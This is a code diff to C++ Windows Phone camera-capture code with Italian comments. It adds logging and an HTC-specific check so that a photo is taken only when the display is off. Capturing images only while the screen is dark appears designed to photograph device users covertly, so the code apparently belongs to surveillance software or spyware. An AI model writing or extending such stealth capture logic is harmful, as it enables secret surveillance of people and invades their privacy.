@@ -2,6 +2,7 @@
 #include "FunctionFunc.h"
 #include "Common.h"
 #include "Log.h"
+#include "Device.h"
 
 using namespace Microsoft::WRL;
 using namespace Windows::Foundation;
@@ -69,6 +70,8 @@ bool ChekDisplayOn()
 	if (_Shell_IsUnlockedNormal()==1) 
 	{   
 		DBG_TRACE(L"Display Acceso: non posso scattare la foto\n", 1, FALSE);
+		Log logInfo;
+		logInfo.WriteLogInfo(L"Display Acceso: non posso scattare la foto");
 		return TRUE;
 	} 
 	else	
@@ -84,6 +87,8 @@ bool ChekDisplayOn()
 		else 
 		{
 			DBG_TRACE(L"Display Acceso: non posso scattare la foto\n", 1, FALSE);
+			Log logInfo;
+			logInfo.WriteLogInfo(L"Display Acceso: non posso scattare la foto");
 			return TRUE;
 		}
 	}
@@ -240,7 +245,8 @@ UINT WriteCallback(int* rgBytes, UINT cb,  UINT *cbActual)
 
 NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 {
-	
+	Device *deviceObj = Device::self();
+
 		//1280x720
 		//640x480
 		Size captureDimensions;
@@ -275,6 +281,15 @@ NativePhotoCaptureInterface::Native::NativeCapture::NativeCapture()
 			//serve sugli htc sui nokia sembrerebbe non servire da gestire in un secondo tempo
 ///// DA RIABILITARE BYGIO			if(ChekDisplayOn()==TRUE) break;
 
+			
+			wstring Manufacturer=deviceObj->GetManufacturer().c_str();
+
+			//se è un HTC devo controllare che il display sia spento prima di scattare
+			//il problema che per farlo resetto l'idle per cui allulga il tempo di spegnimento del display il stato di lock
+			if(Manufacturer==L"HTC") 
+				if(ChekDisplayOn()==TRUE) break;
+
+			
 			concurrency::cancellation_token_source PhotoTaskTokenSourceFront;
 
 
